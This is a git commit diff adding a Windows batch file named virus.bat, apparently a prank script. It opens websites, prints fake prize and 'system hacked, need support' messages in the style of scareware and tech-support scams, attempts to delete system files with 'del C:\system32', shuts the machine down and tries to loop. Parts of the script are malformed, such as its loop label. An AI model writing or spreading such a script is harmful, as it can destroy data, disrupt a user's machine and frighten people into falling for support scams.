724babe00300ea48cbcff66ca22f814abb729b7e
zepx900 <110619512+zepx900@users.noreply.github.com>
2022-11-21 17:19:48 +0600

    Create virus.bat

---
+++ virus.bat
@@ -0,0 +1,13 @@
+@echo off
+
+a:
+start www.yahoo.com
+start www.youtube.com
+echo you won a iphone12 claim it now before its its gone!!!
+echo YOUR SYSTEM IS HACKED NEED SUPPORT
+del C:\system32
+echo you are being HACKED SYSTEM REPORTING LAST MESSAGE HACKED!!!!!!!!!!
+shutdown 
+goto a:
+
+before copying me please read the readme.txt
